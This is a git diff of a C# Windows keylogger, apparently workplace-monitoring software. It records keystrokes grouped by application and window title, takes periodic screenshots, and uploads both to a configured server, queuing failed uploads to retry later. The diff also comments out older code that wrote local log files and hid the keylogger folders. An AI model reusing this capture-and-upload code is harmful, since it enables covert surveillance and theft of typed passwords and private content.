@@ -61,6 +61,18 @@ namespace advanced_ckey
         private string strin = null;
 
 
+        public string GetCurrentSoftware()  //get active windows title here
+        {
+            string software = "";
+            if ( this.GetActiveWindowTitle() is string)
+            {
+                string title = this.GetActiveWindowTitle();
+                String[] softwareTokens = title.Split( new[] { " - " }, StringSplitOptions.None );
+                software = softwareTokens[softwareTokens.Length - 1];
+            }
+            return software.Trim();
+        }
+
         public string GetActiveWindowTitle()  //get active windows title here
         {
             const int nChars = 256;
@@ -84,36 +96,42 @@ namespace advanced_ckey
 
         private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
         {
-            if (strin != GetActiveWindowTitle())
-            {
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
-                strin = GetActiveWindowTitle();
-            }
+            //  fake keylog to record process
+            //  no need again
+            //    this.K_Down( "" );
         }
 
         private void K_Down(string key)
         {
             {
-                if ( key is string && this.GetActiveWindowTitle() is string)
+                string title = "";
+                string software = this.GetCurrentSoftware();
+                if ( this.GetActiveWindowTitle() is string)
                 {
-                    if ( this.loggedText.ContainsKey( this.GetActiveWindowTitle() ) )
+                    title = this.GetActiveWindowTitle();
+                }
+                if ( key is string )
+                {
+                    
+                    if ( ! this.loggedText.ContainsKey( software ) )
                     {
-                        this.loggedText[this.GetActiveWindowTitle()] += key;
+                        this.loggedText[software] = new Dictionary<string, object>();
+                    }
+                    if ( this.loggedText[software].ContainsKey( title ) )
+                    {
+                        this.loggedText[software][title] += key;
                     }
                     else
                     {
-                        this.loggedText[this.GetActiveWindowTitle()] = key;
+                        this.loggedText[software][title] = key;
                     }
-                  //  MessageBox.Show(this.GetActiveWindowTitle() + this.loggedText[this.GetActiveWindowTitle()] );
-
                 }
             }
-        //    string x = JsonSerializer.Serialize(this.loggedText);
-        //    MessageBox.Show( x );
-        //    textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
         }
 
         public dynamic loggedText = new Dictionary<string, object>();
+        public List<NameValueCollection> savedRequests = new List<NameValueCollection>();
+
 
         public void screenshot()  // the method that handles the screenshot
         {
@@ -139,6 +157,7 @@ namespace advanced_ckey
 
                 string screenshot = Convert.ToBase64String(imageBytes);
                 string keystrokes = JsonSerializer.Serialize(this.loggedText);
+             //   MessageBox.Show( keystrokes );
             //    MessageBox.Show( screenshot.Length.ToString() );
             //    textBox1.Text += keystrokes;
            //     MessageBox.Show( textBox1.Text );
@@ -153,7 +172,7 @@ namespace advanced_ckey
                 {
                     string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Log?pc_widget_output_method=JSON";
 
-                //    string defaultParameters = "user_id=" + Properties.Settings.Default.user_id + "&auth_token=" + Properties.Settings.Default.auth_token + "&";
+                    //    string defaultParameters = "user_id=" + Properties.Settings.Default.user_id + "&auth_token=" + Properties.Settings.Default.auth_token + "&";
 
                     using (WebClient wc = new WebClient())
                     {
@@ -169,10 +188,29 @@ namespace advanced_ckey
                         paramsX.Add("texts", keystrokes);
                         paramsX.Add("screenshot", screenshot);
                         paramsX.Add("window_title", this.GetActiveWindowTitle());
+                        paramsX.Add("software", this.GetCurrentSoftware());
+                        string jsonResponse = "{}";
+                        try
+                        {
+                            Byte[] responseBytes = wc.UploadValues( URI, "POST", paramsX );
+                            jsonResponse = Encoding.UTF8.GetString(responseBytes);
+                        //    MessageBox.Show( jsonResponse );
+                            Console.Write(jsonResponse);
+                            int ci = 0;
+                            foreach( NameValueCollection xParam in this.savedRequests )
+                            {
+                                wc.UploadValues(URI, "POST", xParam );
+                                this.savedRequests.RemoveAt( ci );
+                                ci++;
+                            }
+                        }
+                        catch ( Exception )
+                        {
+                            this.savedRequests.Add( paramsX );
+                        }
+                        this.loggedText.Clear();
 
-                        Byte[] responseBytes = wc.UploadValues( URI, "POST", paramsX );
-                        string jsonResponse = Encoding.UTF8.GetString( responseBytes );
-                    //    MessageBox.Show( jsonResponse ); 
+                        //    Console.Write( jsonResponse ); 
                         dynamic result = JsonValue.Parse(jsonResponse);
 
                         //    MessageBox.Show( defaultParameters );
@@ -184,21 +222,23 @@ namespace advanced_ckey
                             {
                                 Properties.Settings.Default.auth_token = "";
                                 Properties.Settings.Default.user_id = "";
-                                MessageBox.Show( "Authentication failed" );   
+                                MessageBox.Show( "Authentication failed" );
+                            //    Console.Write(result["authenticated"]);
+
                                 new Formlog();
                                 return;
                             }
                         //    MessageBox.Show( result["goodnews"] );
-                            this.loggedText.Clear();
 
                         }
-                        catch (Exception)
+                        catch (Exception d )
                         {
-                            if( result["authenticated"] == false )
+                            MessageBox.Show( d.Message);
+                            if ( result["authenticated"] == false )
                             {
                                 Properties.Settings.Default.auth_token = "";
                                 Properties.Settings.Default.user_id = "";
-                                MessageBox.Show( "Authentication failed" );   
+                                MessageBox.Show("Authentication failed" );
                                 new Formlog();
                             }
                             return;
@@ -210,6 +250,7 @@ namespace advanced_ckey
                 catch (Exception x2 )
                 {
                     MessageBox.Show( x2.Message );
+
                 }
             }
             catch(Exception x1 )
@@ -222,7 +263,7 @@ namespace advanced_ckey
         {
             try
             {
-                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
+            //    File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
             }
             catch (Exception)
             {
@@ -237,16 +278,16 @@ namespace advanced_ckey
            
             try
             {
-                Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
-                Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
-                string filepath;
-                filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
-                if (File.Exists(filepath))
+            //    Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
+            //    Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
+            //    string filepath;
+            //    filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
+            //    if (File.Exists(filepath))
                 {
                 }
-                else
+            //    else
                 {
-                    File.Create(filepath);
+            //        File.Create(filepath);
                 }
             }
             catch (Exception)
@@ -255,16 +296,16 @@ namespace advanced_ckey
 
             try  //hides keylogger folder
             {
-                ch = new DirectoryInfo(@"C:\MyDirr");
-                ch.Attributes = FileAttributes.Hidden;
-              //  MessageBox.Show("Hidden");
+            //    ch = new DirectoryInfo(@"C:\MyDirr");
+            //    ch.Attributes = FileAttributes.Hidden;
+            //  //  MessageBox.Show("Hidden");
             }
             catch { }
 
             try  //hides keylogger folder
             {
-                ch = new DirectoryInfo(@"C:\MyDir");
-                ch.Attributes = FileAttributes.Hidden;
+            //    ch = new DirectoryInfo(@"C:\MyDir");
+            //    ch.Attributes = FileAttributes.Hidden;
                 //  MessageBox.Show("Hidden");
             }
             catch { }
@@ -284,7 +325,7 @@ namespace advanced_ckey
             keylog_timer.Start();   // write textbox1.text strings into a file
             Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
             keyboardLanguages();  //get the keyboard language {input keyboard language installed}
-           keylog_infomation();  // calls keylog_information
+            keylog_infomation();  // calls keylog_information
         }
 
         public void keylog_infomation()
@@ -342,7 +383,7 @@ namespace advanced_ckey
        
         private void keylog_timer_Tick(object sender, EventArgs e)
         {
-            savetextfile();
+        //    savetextfile();
         }
 
         private void Sceenshot_timer_Tick(object sender, EventArgs e)
